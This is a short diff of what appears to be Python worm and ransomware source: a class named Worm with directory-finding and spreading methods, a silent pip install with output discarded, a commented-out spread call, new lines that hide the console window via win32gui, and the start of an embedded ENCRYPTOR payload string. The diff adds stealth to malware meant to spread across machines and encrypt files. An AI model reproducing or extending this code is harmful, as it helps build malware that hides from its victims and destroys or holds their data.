@@ -1,5 +1,5 @@
 import os
-os.system("pip install pypiwin32 pycryptodome > /dev/null 2>&1")
+os.system("pip install pypiwin32 pycryptodome cryptography > /dev/null 2>&1")
 import sys
 import time
 import threading
@@ -58,9 +58,12 @@ class Worm:
         if not self.directories_found:
             self.find_directories()
 
-        self.spread()
+        # self.spread()
 
 if __name__ == "__main__":
+    hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
     ENCRYPTOR = """import os
 import base64
 import sys
